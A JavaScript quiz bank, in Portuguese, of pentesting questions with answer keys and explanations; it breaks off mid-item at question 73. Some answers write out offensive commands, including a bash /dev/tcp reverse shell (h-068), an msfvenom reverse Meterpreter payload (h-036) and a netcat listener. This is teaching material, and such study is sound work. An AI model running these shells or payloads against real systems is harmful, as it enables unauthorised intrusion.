// OmniVoid Studios - Banco de Questões da Jornada Hack (300 Questões - Nível Elite Grey Hat)
(function(window) {
	'use strict';
	window.OMNIVOID_HACK_QUESTIONS = [
  {
    "id": "h-001",
    "cat": "Metodologia & Fundamentos",
    "q": "O que significa \"Pentest\"?",
    "options": [
      "Teste de desempenho de servidores",
      "Teste de penetração — simulação autorizada de ataques cibernéticos",
      "Teste de ping em redes",
      "Teste de software unitário"
    ],
    "answer": 1,
    "exp": "Pentest (Penetration Test) é a prática autorizada e controlada de simular ciberataques contra sistemas para identificar e remediar vulnerabilidades antes que agentes maliciosos as explorem."
  },
  {
    "id": "h-002",
    "cat": "Metodologia & Fundamentos",
    "q": "Qual é a PRIMEIRA fase de um pentest?",
    "options": [
      "Exploração",
      "Relatório",
      "Reconhecimento (Recon)",
      "Escalação de privilégio"
    ],
    "answer": 2,
    "exp": "O Reconhecimento (Recon / Footprinting) é o ponto de partida essencial para coletar informações técnicas, mapear o escopo e definir o plano de ataque."
  },
  {
    "id": "h-003",
    "cat": "Metodologia & Fundamentos",
    "q": "Qual fase acontece DEPOIS de ganhar acesso a um sistema?",
    "options": [
      "Pós-exploração",
      "Varredura",
      "Reconhecimento passivo",
      "Documentação do escopo"
    ],
    "answer": 0,
    "exp": "Após comprometer um alvo e obter shell/sessão, inicia-se a Pós-exploração (enumeração interna, escalação de privilégios, coleta de credenciais e pivoting)."
  },
  {
    "id": "h-004",
    "cat": "OSINT & Recon",
    "q": "O que caracteriza o reconhecimento PASSIVO?",
    "options": [
      "Rodar Nmap contra o alvo",
      "Coletar informações sem tocar diretamente no alvo",
      "Explorar vulnerabilidades",
      "Quebrar senhas"
    ],
    "answer": 1,
    "exp": "O Reconhecimento Passivo usa fontes públicas (OSINT, Shodan, WHOIS, DNS) sem enviar pacotes diretos ao servidor do alvo, permanecendo invisível."
  },
  {
    "id": "h-005",
    "cat": "Web Hacking & Burp",
    "q": "Qual metodologia é focada especificamente em testes de aplicações web?",
    "options": [
      "MITRE ATT&CK",
      "OSSTMM",
      "OWASP Testing Guide (WSTG)",
      "ISO 27001"
    ],
    "answer": 2,
    "exp": "O OWASP Web Security Testing Guide (WSTG) é o principal framework mundial dedicado à segurança e testes de invasão em aplicações web e APIs."
  },
  {
    "id": "h-006",
    "cat": "Metodologia & Fundamentos",
    "q": "Para que serve o MITRE ATT&CK?",
    "options": [
      "Catalogar táticas e técnicas usadas por atacantes no mundo real",
      "Criar antivírus comerciais",
      "Fazer backup automatizado de sistemas",
      "Gerenciar senhas mestras"
    ],
    "answer": 0,
    "exp": "O MITRE ATT&CK é uma base de conhecimento global que mapeia e categoriza táticas, técnicas e procedimentos (TTPs) de adversários cibernéticos."
  },
  {
    "id": "h-007",
    "cat": "Metodologia & Fundamentos",
    "q": "Qual é a ÚLTIMA fase de um pentest profissional?",
    "options": [
      "Persistência",
      "Relatório Técnico & Executivo",
      "Exploração",
      "Varredura de portas"
    ],
    "answer": 1,
    "exp": "O Relatório é o entregável de maior valor de um pentest: documenta as vulnerabilidades, impacto de negócio, evidências e orientações de remediação."
  },
  {
    "id": "h-008",
    "cat": "Grey Hat & Ética",
    "q": "O que são \"Regras de Engajamento\" (Rules of Engagement - RoE)?",
    "options": [
      "Comandos avançados de frameworks",
      "Documento que define escopo, autorização formal, horários e limites do teste",
      "Scripts de automação em Python",
      "Regras de pontuação de um CTF"
    ],
    "answer": 1,
    "exp": "As Regras de Engajamento delimitam rigorosamente o escopo, IPs autorizados, janelas de teste e canais de emergência para garantir a legalidade."
  },
  {
    "id": "h-009",
    "cat": "Metodologia & Fundamentos",
    "q": "Qual é a ordem cronológica correta das fases de um teste de invasão?",
    "options": [
      "Exploração → Recon → Relatório → Scanning",
      "Recon → Scanning → Exploração → Pós-exploração → Relatório",
      "Scanning → Recon → Relatório → Exploração",
      "Relatório → Recon → Scanning → Exploração"
    ],
    "answer": 1,
    "exp": "O fluxo canônico segue: Reconhecimento → Varredura (Scanning) → Exploração (Gaining Access) → Pós-exploração (Post-Exploit) → Relatório (Reporting)."
  },
  {
    "id": "h-010",
    "cat": "Grey Hat & Ética",
    "q": "Testar a segurança de um sistema SEM autorização formal por escrito é:",
    "options": [
      "Aceitável se for apenas uma varredura leve de portas",
      "Aceitável se nenhum dano for causado aos dados",
      "Crime tipificado (no Brasil, art. 154-A do Código Penal - Invasão de Dispositivo Informático)",
      "Aceitável se for descoberto e reportado privadamente depois"
    ],
    "answer": 2,
    "exp": "Sem autorização formal (contrato/escopo assinado), qualquer teste intrusivo é ilegal sob o art. 154-A do CP brasileiro e leis equivalentes internacionais."
  },
  {
    "id": "h-011",
    "cat": "Linux & Lab Setup",
    "q": "Qual distribuição Linux é a mais popular e padrão na indústria para testes de invasão?",
    "options": [
      "Ubuntu Server",
      "Kali Linux",
      "Fedora Workstation",
      "Debian Minimal"
    ],
    "answer": 1,
    "exp": "O Kali Linux (mantido pela Offensive Security) é a distro mais consagrada, contendo centenas de ferramentas pré-instaladas e atualizadas."
  },
  {
    "id": "h-012",
    "cat": "Linux & Lab Setup",
    "q": "Qual distribuição focada em segurança é baseada em Arch Linux e oferece milhares de ferramentas?",
    "options": [
      "Parrot OS",
      "BackBox",
      "BlackArch",
      "Linux Mint"
    ],
    "answer": 2,
    "exp": "O BlackArch é baseado em Arch Linux e possui um repositório gigantesco com mais de 2.800 ferramentas especializadas."
  },
  {
    "id": "h-013",
    "cat": "Linux & Lab Setup",
    "q": "Qual programa de virtualização open source permite rodar o Kali Linux dentro do Windows com segurança?",
    "options": [
      "Wireshark",
      "VirtualBox",
      "Burp Suite",
      "Metasploit"
    ],
    "answer": 1,
    "exp": "O Oracle VirtualBox permite criar máquinas virtuais isoladas para o Kali e alvos vulneráveis de teste sem afetar o host."
  },
  {
    "id": "h-014",
    "cat": "Linux & Lab Setup",
    "q": "O Parrot OS se destaca em relação ao Kali principalmente por:",
    "options": [
      "Ser um software pago",
      "Ser mais leve e possuir ferramentas dedicadas a privacidade, criptografia e computação forense",
      "Ser exclusivo para plataformas Windows",
      "Não possuir interface gráfica"
    ],
    "answer": 1,
    "exp": "O Parrot Security OS é baseado em Debian, famoso por seu ambiente leve (MATE), anonimato integrado (AnonSurf) e ferramentas forenses."
  },
  {
    "id": "h-015",
    "cat": "Linux & Lab Setup",
    "q": "Qual comando no Kali Linux instala a coleção universal de wordlists SecLists?",
    "options": [
      "apt install seclists",
      "apt install rockyou-pack",
      "apt install dictionaries-all",
      "apt install wordbase"
    ],
    "answer": 0,
    "exp": "O comando 'sudo apt install seclists' instala a maior coleção de wordlists para senhas, URLs, fuzzing e payloads em /usr/share/seclists."
  },
  {
    "id": "h-016",
    "cat": "Varredura & Nmap",
    "q": "Para que serve primordialmente a ferramenta Nmap?",
    "options": [
      "Quebrar senhas em arquivos ZIP",
      "Varredura de portas, identificação de serviços, detecção de SO e scripts de auditoria",
      "Interceptar e modificar requisições HTTP",
      "Criar máquinas virtuais"
    ],
    "answer": 1,
    "exp": "O Nmap (Network Mapper) é o scanner de rede mais potente do mundo para descoberta de hosts, portas abertas, banners e scripts NSE."
  },
  {
    "id": "h-017",
    "cat": "OSINT & Recon",
    "q": "Qual ferramenta automatizada de OSINT coleta e-mails, subdomínios, IPs e nomes a partir de motores de busca?",
    "options": [
      "theHarvester",
      "John the Ripper",
      "Hydra",
      "Netcat"
    ],
    "answer": 0,
    "exp": "theHarvester pesquisa fontes públicas (Google, Bing, LinkedIn, Shodan) para levantar inteligência preliminar sobre uma organização."
  },
  {
    "id": "h-018",
    "cat": "OSINT & Recon",
    "q": "O que o motor de busca Shodan permite pesquisar?",
    "options": [
      "Senhas vazadas de funcionários em redes sociais",
      "Dispositivos, servidores, câmeras e serviços IoT diretamente conectados à internet",
      "Vírus em pendrives locais",
      "Código-fonte privado de repositórios"
    ],
    "answer": 1,
    "exp": "O Shodan escaneia constantemente a internet inteira, indexando banners de portas abertas em servidores, roteadores, câmeras e sistemas industriais."
  },
  {
    "id": "h-019",
    "cat": "OSINT & Recon",
    "q": "O que são conhecidos como \"Google Dorks\"?",
    "options": [
      "Vírus que atacam a infraestrutura do Google",
      "Operadores avançados de busca (site:, inurl:, filetype:) para encontrar dados sensíveis expostos",
      "Extensões do navegador Chrome para pentest",
      "Módulos auxiliares do scanner Nmap"
    ],
    "answer": 1,
    "exp": "Google Hacking / Dorks utilizam filtros avançados do Google para descobrir painéis administrativos, arquivos de configuração e backups desprotegidos."
  },
  {
    "id": "h-020",
    "cat": "Varredura & Nmap",
    "q": "Qual parâmetro do Nmap instrui a verificação de TODAS as 65.535 portas TCP possíveis?",
    "options": [
      "nmap -a alvo",
      "nmap -p- alvo",
      "nmap --all alvo",
      "nmap -u 65535 alvo"
    ],
    "answer": 1,
    "exp": "A flag '-p-' (equivalente a '-p 1-65535') faz o Nmap escanear todo o espectro de portas TCP, evitando que serviços em portas não convencionais passem despercebidos."
  },
  {
    "id": "h-021",
    "cat": "Varredura & Nmap",
    "q": "O que faz o parâmetro '-sV' no comando Nmap?",
    "options": [
      "Varre exclusivamente portas UDP",
      "Detecta a versão exata e banner dos serviços em execução nas portas abertas",
      "Executa exploits automáticos",
      "Ativa o modo silencioso sem envio de pacotes"
    ],
    "answer": 1,
    "exp": "A flag '-sV' (Service Version) sonda as portas abertas com requisições específicas para determinar os números de versão dos softwares em execução."
  },
  {
    "id": "h-022",
    "cat": "Web Hacking & Burp",
    "q": "Qual arquivo padrão de um site costuma revelar diretórios sensíveis que os administradores não queriam que robôs indexassem?",
    "options": [
      "index.html",
      "sitemap.xml",
      "robots.txt",
      "config.json"
    ],
    "answer": 2,
    "exp": "O 'robots.txt' indica pastas restritas aos bots de busca (Disallow: /admin/, /backup/), servindo como um mapa valioso para atacantes."
  },
  {
    "id": "h-023",
    "cat": "Metodologia & Fundamentos",
    "q": "Qual é uma conceituada alternativa OPEN SOURCE e gratuita ao scanner corporativo Nessus?",
    "options": [
      "Burp Suite Professional",
      "OpenVAS / Greenbone Community Edition",
      "sqlmap",
      "Aircrack-ng"
    ],
    "answer": 1,
    "exp": "O OpenVAS (integrado ao Greenbone Vulnerability Management) é um scanner completo de vulnerabilidades open source com milhares de testes NVTs."
  },
  {
    "id": "h-024",
    "cat": "Web Hacking & Burp",
    "q": "Para que serve a ferramenta especializada WPScan?",
    "options": [
      "Escanear redes sem fio Wi-Fi",
      "Auditar vulnerabilidades, plugins, temas e usuários em sites WordPress",
      "Quebrar hashes de senhas offline",
      "Escanear firewalls de borda"
    ],
    "answer": 1,
    "exp": "WPScan é o scanner de referência para detectar falhas em plugins desatualizados, temas vulneráveis e enumeração de usuários em CMS WordPress."
  },
  {
    "id": "h-025",
    "cat": "Metodologia & Fundamentos",
    "q": "Qual scanner ultrarrápido usa templates em formato YAML mantidos pela comunidade para detectar CVEs?",
    "options": [
      "Nikto",
      "Nuclei",
      "Maltego",
      "pspy"
    ],
    "answer": 1,
    "exp": "Nuclei (desenvolvido pela ProjectDiscovery) envia requisições estruturadas via templates YAML para identificar falhas conhecidas com altíssima velocidade."
  },
  {
    "id": "h-026",
    "cat": "Metodologia & Fundamentos",
    "q": "O Exploit-DB (exploit-db.com) é:",
    "options": [
      "Um software antivírus em nuvem",
      "Uma base pública e consagrada de código-fonte de exploits e provas de conceito (PoCs)",
      "Um scanner de rede corporativo",
      "Um framework de envio de phishing"
    ],
    "answer": 1,
    "exp": "O Exploit-DB é o repositório público de exploits mantido pela Offensive Security, compilando códigos de exploração para vulnerabilidades documentadas."
  },
  {
    "id": "h-027",
    "cat": "Metodologia & Fundamentos",
    "q": "Qual comando de terminal no Kali Linux busca exploits localmente na base offline do Exploit-DB?",
    "options": [
      "exploit find",
      "searchsploit [termo]",
      "msf search",
      "cve-lookup [termo]"
    ],
    "answer": 1,
    "exp": "O comando 'searchsploit apache 2.4' busca rapidamente no arquivo local de exploits sem necessidade de conexão ativa com a internet."
  },
  {
    "id": "h-028",
    "cat": "Web Hacking & Burp",
    "q": "Qual ferramenta consagrada automatiza a detecção e exploração de falhas de SQL Injection (SQLi)?",
    "options": [
      "Hydra",
      "sqlmap",
      "ffuf",
      "NetExec"
    ],
    "answer": 1,
    "exp": "sqlmap automatiza a injeção SQL, permitindo extrair bancos inteiros, despejar hashes, testar técnicas boolean/time-based e até obter comandos no SO."
  },
  {
    "id": "h-029",
    "cat": "Senhas & Força Bruta",
    "q": "Qual ferramenta realiza ataques de força bruta online contra serviços de rede como SSH, FTP, RDP e SMB?",
    "options": [
      "John the Ripper",
      "Wireshark",
      "Hydra",
      "Amass"
    ],
    "answer": 2,
    "exp": "THC-Hydra é um autenticador de login paralelo e veloz capaz de testar credenciais contra dezenas de protocolos de rede simultaneamente."
  },
  {
    "id": "h-030",
    "cat": "Senhas & Força Bruta",
    "q": "Qual é a principal diferença conceitual entre John the Ripper e Hydra?",
    "options": [
      "Nenhuma, são ferramentas idênticas",
      "John quebra hashes de senhas offline; Hydra testa credenciais online via rede contra serviços ativos",
      "Hydra funciona só em Linux e John só em Windows",
      "John é um software comercial pago e Hydra é gratuito"
    ],
    "answer": 1,
    "exp": "John the Ripper (offline cracker) computa hashes localmente sem tocar na rede; Hydra (online cracker) dispara requisições de login para o servidor alvo."
  },
  {
    "id": "h-031",
    "cat": "Web Hacking & Burp",
    "q": "Qual ferramenta é o padrão da indústria para interceptar, inspecionar e manipular o tráfego HTTP/HTTPS como proxy web?",
    "options": [
      "Nmap",
      "Burp Suite",
      "tcpdump",
      "enum4linux"
    ],
    "answer": 1,
    "exp": "Burp Suite (da PortSwigger) atua no meio da comunicação entre navegador e servidor web, permitindo alterar qualquer cabeçalho ou parâmetro."
  },
  {
    "id": "h-032",
    "cat": "Web Hacking & Burp",
    "q": "Qual é a consagrada alternativa gratuita e open source da OWASP ao Burp Suite?",
    "options": [
      "OWASP ZAP (Zed Attack Proxy)",
      "Nessus Essentials",
      "Metasploit Pro",
      "Censys Search"
    ],
    "answer": 0,
    "exp": "OWASP ZAP é um proxy web totalmente gratuito, open source e extensível com scanners ativos/passivos e suporte a automação."
  },
  {
    "id": "h-033",
    "cat": "Web Hacking & Burp",
    "q": "Para que servem primordialmente ferramentas como gobuster, dirb e ffuf?",
    "options": [
      "Quebrar criptografia RSA",
      "Fuzzing e enumeração de diretórios, rotas e arquivos ocultos em servidores web",
      "Capturar pacotes em redes locais",
      "Gerar payloads maliciosos em C#"
    ],
    "answer": 1,
    "exp": "Essas ferramentas testam milhares de palavras contra um servidor HTTP para descobrir endpoints secretos (ex: /admin, /api/v1/debug, .env)."
  },
  {
    "id": "h-034",
    "cat": "Metasploit Framework",
    "q": "No Kali Linux, qual comando inicia o console interativo do Metasploit Framework?",
    "options": [
      "msf run",
      "msfconsole",
      "exploit start",
      "meterpreter go"
    ],
    "answer": 1,
    "exp": "'msfconsole' carrega o ambiente CLI unificado do Metasploit com acesso a milhares de exploits, payloads, encoders e módulos auxiliares."
  },
  {
    "id": "h-035",
    "cat": "Metasploit Framework",
    "q": "O que é o Meterpreter no contexto do Metasploit?",
    "options": [
      "Um scanner de portas simples",
      "Um payload avançado executado na memória que oferece uma sessão interativa com comandos poderosos",
      "Um editor de texto para escrever exploits",
      "Um gerador de listas de palavras"
    ],
    "answer": 1,
    "exp": "O Meterpreter opera via injeção DLL na memória (in-memory execution), fornecendo comandos de pós-exploração sem gravar arquivos no disco da vítima."
  },
  {
    "id": "h-036",
    "cat": "Metasploit Framework",
    "q": "Qual sintaxe padrão do utilitário msfvenom gera um executável de conexão reversa para Windows x64?",
    "options": [
      "msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=[IP] LPORT=4444 -f exe -o rev.exe",
      "msfvenom --scan [alvo]",
      "msfvenom -listen 4444",
      "msfvenom exploit --build"
    ],
    "answer": 0,
    "exp": "msfvenom combina gerador de payloads e encoders: a flag '-p' define o payload, 'LHOST/LPORT' os parâmetros de conexão e '-f exe' o formato de saída."
  },
  {
    "id": "h-037",
    "cat": "Redes & Shells",
    "q": "O que conceitualmente caracteriza um \"Reverse Shell\" (shell reverso)?",
    "options": [
      "A máquina comprometida do alvo inicia a conexão de volta para a máquina ouvinte do atacante",
      "O atacante conecta diretamente na porta 22 do alvo",
      "Um shell com os caracteres do teclado invertidos",
      "Um shell local criptografado sem rede"
    ],
    "answer": 0,
    "exp": "Em um reverse shell, o alvo conecta para fora (outbound), o que frequentemente contorna regras rígidas de firewall de entrada (inbound) e NAT."
  },
  {
    "id": "h-038",
    "cat": "Escalação de Privilégio",
    "q": "O que significa o termo \"Escalação de Privilégio\" (Privilege Escalation)?",
    "options": [
      "Instalar múltiplos programas em lote",
      "Elevar o nível de autorização (ex.: de usuário comum www-data para root ou SYSTEM) a partir de um acesso inicial",
      "Aumentar a potência do sinal Wi-Fi",
      "Criar novos grupos locais de visitantes"
    ],
    "answer": 1,
    "exp": "Privesc é o processo de explorar má configurações, permissões fracas ou vulnerabilidades no kernel para assumir o controle total do sistema operacional."
  },
  {
    "id": "h-039",
    "cat": "Linux & Lab Setup",
    "q": "Qual comando no Linux lista exatamente quais binários e privilégios o usuário atual pode executar via sudo?",
    "options": [
      "sudo -l",
      "sudo list",
      "whoami sudo",
      "sudo show"
    ],
    "answer": 0,
    "exp": "'sudo -l' lista os privilégios do arquivo /etc/sudoers para o usuário atual, permitindo identificar binários que rodam como root sem pedir senha (NOPASSWD)."
  },
  {
    "id": "h-040",
    "cat": "Escalação de Privilégio",
    "q": "O que são arquivos com bit SUID (Set User ID) ativado no Linux?",
    "options": [
      "Arquivos de log temporários do sistema",
      "Executáveis que rodam com os privilégios do proprietário do arquivo (geralmente root) em vez de quem os invocou",
      "Arquivos compactados em formato tar",
      "Scripts de inicialização do systemd"
    ],
    "answer": 1,
    "exp": "Se um binário SUID com dono root tiver falhas de segurança ou permitir comandos externos, ele pode ser explorado para obter root instantaneamente."
  },
  {
    "id": "h-041",
    "cat": "Escalação de Privilégio",
    "q": "Qual plataforma online é o catálogo definitivo de técnicas para abusar de binários legítimos do Linux com sudo/SUID?",
    "options": [
      "GTFOBins (gtfobins.github.io)",
      "GitHub Trending",
      "Shodan Explore",
      "Stack Overflow"
    ],
    "answer": 0,
    "exp": "GTFOBins documenta como binários Unix comuns (find, vim, bash, python, awk, tar) podem ser usados para escapar de shells restritos ou obter root."
  },
  {
    "id": "h-042",
    "cat": "Escalação de Privilégio",
    "q": "Qual script famoso automatiza a auditoria e enumeração profunda de vetores de escalação de privilégios em Linux e Windows?",
    "options": [
      "PEASS-ng (LinPEAS / WinPEAS)",
      "sqlmap",
      "Aircrack-ng",
      "gobuster"
    ],
    "answer": 0,
    "exp": "LinPEAS e WinPEAS analisam permissões, processos, serviços, tarefas agendadas, CVEs de kernel e senhas expostas, destacando vetores em cores vivas."
  },
  {
    "id": "h-043",
    "cat": "Escalação de Privilégio",
    "q": "No Windows, qual privilégio comum em contas de serviço (IIS/MSSQL) viabiliza a escalação para SYSTEM através de técnicas de personificação de token (Potato)?",
    "options": [
      "SeBackupPrivilege",
      "SeImpersonatePrivilege",
      "SeShutdownPrivilege",
      "SeDebugMode"
    ],
    "answer": 1,
    "exp": "SeImpersonatePrivilege permite que o processo personifique o token de outro cliente/serviço; exploits da família Potato abusam disso para virar SYSTEM."
  },
  {
    "id": "h-044",
    "cat": "Linux & Lab Setup",
    "q": "O que a ferramenta 'pspy' permite realizar em sistemas Linux?",
    "options": [
      "Escanear portas de rede",
      "Monitorar a execução de novos processos e tarefas do cron em tempo real sem precisar de privilégios de root",
      "Quebrar senhas do /etc/shadow",
      "Instalar backdoors persistentes"
    ],
    "answer": 1,
    "exp": "O pspy monitora chamadas inotify no /proc, detectando comandos rápidos disparados pelo cron ou administradores com privilégios elevados."
  },
  {
    "id": "h-045",
    "cat": "Windows & Active Directory",
    "q": "Qual ferramenta utiliza teoria dos grafos para mapear e visualizar relacionamentos e caminhos de ataque em domínios Active Directory?",
    "options": [
      "BloodHound",
      "Nikto",
      "Wireshark",
      "feroxbuster"
    ],
    "answer": 0,
    "exp": "BloodHound coleta dados de AD (via SharpHound) e exibe caminhos diretos (Shortest Path to Domain Admin) explorando permissões ACLs abusivas."
  },
  {
    "id": "h-046",
    "cat": "Redes & Shells",
    "q": "Qual software de análise de pacotes é a principal ferramenta para inspecionar o tráfego detalhado de rede?",
    "options": [
      "Hydra",
      "Wireshark",
      "gobuster",
      "Metasploit"
    ],
    "answer": 1,
    "exp": "Wireshark disseca protocolos em camadas (TCP, UDP, DNS, HTTP, SMB), permitindo investigar comunicações em tempo real e arquivos PCAP gravados."
  },
  {
    "id": "h-047",
    "cat": "Redes & Shells",
    "q": "Qual comando do Netcat abre um listener (porta em escuta) na porta 4444 para receber conexões de terminal?",
    "options": [
      "nc -lvnp 4444",
      "nc --open 4444",
      "netcat start 4444",
      "nc -p 4444 -run"
    ],
    "answer": 0,
    "exp": "'nc -lvnp 4444' coloca o Netcat em modo Listen (-l), Verbose (-v), Numeric-only sem DNS (-n) e especifica a Porta (-p 4444)."
  },
  {
    "id": "h-048",
    "cat": "Metodologia & Fundamentos",
    "q": "Qual linguagem de programação é considerada a mais importante e versátil para automação de scripts, exploits e ferramentas em pentest?",
    "options": [
      "Java",
      "Python",
      "COBOL",
      "Swift"
    ],
    "answer": 1,
    "exp": "Python é a linguagem hegemônica em cibersegurança devido à sua sintaxe enxuta e bibliotecas especializadas (Requests, Scapy, Pwntools, Impacket)."
  },
  {
    "id": "h-049",
    "cat": "Labs & Treinamento",
    "q": "Qual plataforma online gamificada é amplamente recomendada para iniciantes praticarem pentest em laboratórios guiados?",
    "options": [
      "Shodan",
      "TryHackMe",
      "Exploit-DB",
      "GitHub Gist"
    ],
    "answer": 1,
    "exp": "TryHackMe oferece salas práticas, trilhas completas de aprendizado e máquinas virtuais prontas para uso direto no navegador."
  },
  {
    "id": "h-050",
    "cat": "Metodologia & Fundamentos",
    "q": "No relatório de pentest, qual seção traduz os achados técnicos em linguagem executiva e impacto de negócio para a diretoria?",
    "options": [
      "Anexos com logs brutos",
      "Sumário Executivo (Executive Summary)",
      "Metodologia detalhada de rede",
      "Evidências de comandos de terminal"
    ],
    "answer": 1,
    "exp": "O Sumário Executivo resume o nível de risco, principais vulnerabilidades e impacto estratégico para tomadores de decisão não técnicos."
  },
  {
    "id": "h-051",
    "cat": "Varredura & Nmap",
    "q": "Qual porta padrão do serviço SMB?",
    "options": [
      "139",
      "445",
      "3389",
      "1433"
    ],
    "answer": 1,
    "exp": "A porta TCP 445 é usada pelo SMB direto sobre IP no Windows/Samba, sendo vetor crucial para enumeração, exploits e relay."
  },
  {
    "id": "h-052",
    "cat": "Varredura & Nmap",
    "q": "Qual porta padrão do RDP (Área de Trabalho Remota do Windows)?",
    "options": [
      "22",
      "443",
      "3389",
      "5900"
    ],
    "answer": 2,
    "exp": "O Remote Desktop Protocol (RDP) da Microsoft escuta por padrão na porta TCP 3389."
  },
  {
    "id": "h-053",
    "cat": "Varredura & Nmap",
    "q": "Qual porta padrão do DNS?",
    "options": [
      "53",
      "67",
      "88",
      "111"
    ],
    "answer": 0,
    "exp": "O protocolo Domain Name System opera tipicamente na porta UDP/TCP 53 (usando TCP para transferências de zona AXFR)."
  },
  {
    "id": "h-054",
    "cat": "Windows & Active Directory",
    "q": "Qual porta padrão do Kerberos?",
    "options": [
      "88",
      "389",
      "464",
      "636"
    ],
    "answer": 0,
    "exp": "O protocolo de autenticação Kerberos do Active Directory opera na porta TCP/UDP 88."
  },
  {
    "id": "h-055",
    "cat": "Varredura & Nmap",
    "q": "Qual porta padrão do SMTP?",
    "options": [
      "21",
      "23",
      "25",
      "110"
    ],
    "answer": 2,
    "exp": "Simple Mail Transfer Protocol (SMTP) opera por padrão na porta TCP 25."
  },
  {
    "id": "h-056",
    "cat": "Varredura & Nmap",
    "q": "Qual serviço roda tipicamente na porta 3306?",
    "options": [
      "PostgreSQL",
      "MySQL/MariaDB",
      "MSSQL",
      "Redis"
    ],
    "answer": 1,
    "exp": "MySQL e MariaDB escutam por padrão na porta TCP 3306."
  },
  {
    "id": "h-057",
    "cat": "Windows & Active Directory",
    "q": "Qual serviço roda tipicamente na porta 5985?",
    "options": [
      "WinRM (HTTP)",
      "VNC",
      "LDAP",
      "TFTP"
    ],
    "answer": 0,
    "exp": "Windows Remote Management (WinRM) usa a porta TCP 5985 para HTTP e 5986 para HTTPS, sendo alvo do evil-winrm."
  },
  {
    "id": "h-058",
    "cat": "Varredura & Nmap",
    "q": "Qual porta é padrão do VNC?",
    "options": [
      "5900",
      "5000",
      "5432",
      "6379"
    ],
    "answer": 0,
    "exp": "Virtual Network Computing (VNC) opera na porta TCP 5900 (ou 5900 + display)."
  },
  {
    "id": "h-059",
    "cat": "Varredura & Nmap",
    "q": "Portas HTTP comuns em \"portas altas\" incluem:",
    "options": [
      "8080, 8000, 8443",
      "1000, 1001, 1002",
      "30000, 30001",
      "Nenhuma, HTTP só usa 80"
    ],
    "answer": 0,
    "exp": "Desenvolvedores frequentemente expõem APIs e painéis alternativos em portas como 8000, 8080, 8443 e 8888."
  },
  {
    "id": "h-060",
    "cat": "Varredura & Nmap",
    "q": "Qual porta padrão do PostgreSQL?",
    "options": [
      "3306",
      "5432",
      "1433",
      "1521"
    ],
    "answer": 1,
    "exp": "PostgreSQL escuta por padrão na porta TCP 5432."
  },
  {
    "id": "h-061",
    "cat": "Linux & Lab Setup",
    "q": "Qual comando mostra o usuário atual no Linux?",
    "options": [
      "whoami",
      "me",
      "user",
      "id -n only"
    ],
    "answer": 0,
    "exp": "'whoami' imprime o nome do usuário associado à sessão atual de terminal."
  },
  {
    "id": "h-062",
    "cat": "Linux & Lab Setup",
    "q": "Qual comando lista arquivos com detalhes e permissões?",
    "options": [
      "ls",
      "ls -la",
      "dir /all",
      "show files"
    ],
    "answer": 1,
    "exp": "'ls -la' lista todos os arquivos (incluindo ocultos iniciados por ponto) com detalhes de dono, grupo, tamanho e permissões."
  },
  {
    "id": "h-063",
    "cat": "Linux & Lab Setup",
    "q": "O que faz o comando cat /etc/passwd?",
    "options": [
      "Cria usuários",
      "Lista usuários do sistema",
      "Mostra senhas em texto claro",
      "Deleta o arquivo passwd"
    ],
    "answer": 1,
    "exp": "O arquivo /etc/passwd lista todas as contas de usuário do sistema, seus IDs (UID/GID), diretórios home e shells padrão."
  },
  {
    "id": "h-064",
    "cat": "Linux & Lab Setup",
    "q": "Onde ficam os hashes de senha no Linux moderno?",
    "options": [
      "/etc/passwd",
      "/etc/shadow (só root lê)",
      "/home/user",
      "/var/log"
    ],
    "answer": 1,
    "exp": "Os hashes criptografados ficam em /etc/shadow, arquivo com permissão restrita de leitura exclusiva ao usuário root."
  },
  {
    "id": "h-065",
    "cat": "Linux & Lab Setup",
    "q": "Qual comando mostra as interfaces de rede e IPs?",
    "options": [
      "ip a ou ifconfig",
      "netstat",
      "show ip",
      "route -n only"
    ],
    "answer": 0,
    "exp": "'ip a' (ou 'ip addr') é o padrão moderno no Linux para exibir endereços IP e estado das interfaces de rede."
  },
  {
    "id": "h-066",
    "cat": "Linux & Lab Setup",
    "q": "O que o comando uname -a revela?",
    "options": [
      "Usuários logados",
      "Informações do kernel e arquitetura do sistema",
      "Portas abertas",
      "Senhas salvas"
    ],
    "answer": 1,
    "exp": "'uname -a' revela a versão do kernel Linux, data de compilação e arquitetura (x86_64, aarch64), essencial para buscar exploits de kernel."
  },
  {
    "id": "h-067",
    "cat": "Linux & Lab Setup",
    "q": "Qual comando baixa um arquivo da internet no Linux?",
    "options": [
      "wget [URL] ou curl -O [URL]",
      "get [URL]",
      "fetch --file [URL]",
      "download [URL]"
    ],
    "answer": 0,
    "exp": "'wget <URL>' e 'curl -O <URL>' são os utilitários de linha de comando mais populares para baixar binários e scripts da web."
  },
  {
    "id": "h-068",
    "cat": "Redes & Shells",
    "q": "No Linux, qual construção em bash estabelece uma sessão interativa remota via descritor de rede?",
    "options": [
      "bash -i >& /dev/tcp/[IP]/[PORTA] 0>&1",
      "bash --reverse [IP]",
      "shell -r [IP]:[PORTA]",
      "bash -c connect [IP]"
    ],
    "answer": 0,
    "exp": "Essa sintaxe redireciona entrada, saída padrão e erro para o socket TCP do ouvinte via pseudo-dispositivo de rede do bash."
  },
  {
    "id": "h-069",
    "cat": "Linux & Lab Setup",
    "q": "Qual comando lista processos em execução?",
    "options": [
      "ps aux",
      "list proc",
      "top -all -save",
      "tasklist /v (em Linux)"
    ],
    "answer": 0,
    "exp": "'ps aux' lista todos os processos de todos os usuários no sistema com detalhes de CPU, memória e linha de comando executada."
  },
  {
    "id": "h-070",
    "cat": "Linux & Lab Setup",
    "q": "O que significa o -rwxr-xr-x na saída do ls -la?",
    "options": [
      "Permissões: dono (rwx), grupo (r-x), outros (r-x)",
      "Nome do arquivo",
      "Tamanho do arquivo",
      "Data de criação"
    ],
    "answer": 0,
    "exp": "A string define permissões Unix em 3 blocos: Dono tem leitura/escrita/execução (rwx), Grupo e Outros têm leitura/execução (r-x)."
  },
  {
    "id": "h-071",
    "cat": "Windows & Active Directory",
    "q": "Qual comando Windows mostra o usuário atual?",
    "options": [
      "whoami",
      "user",
      "id",
      "me"
    ],
    "answer": 0,
    "exp": "'whoami' no Windows retorna o domínio/computador e o nome da conta do usuário atual (ex: DOMINIO\\administrador)."
  },
  {
    "id": "h-072",
    "cat": "Windows & Active Directory",
    "q": "Qual comando Windows lista informações do sistema (patches, SO)?",
    "options": [
      "systeminfo",
      "sysinfo",
      "info system",
      "wininfo"
    ],
    "answer": 0,
    "exp": "'systeminfo' exibe a versão do Windows, arquitetura, memória instalada e a lista completa de Hotfixes (patches de segurança instalados)."
  },
  {
    "id": "h-073",
    "cat": "Escalação de Privilégio",
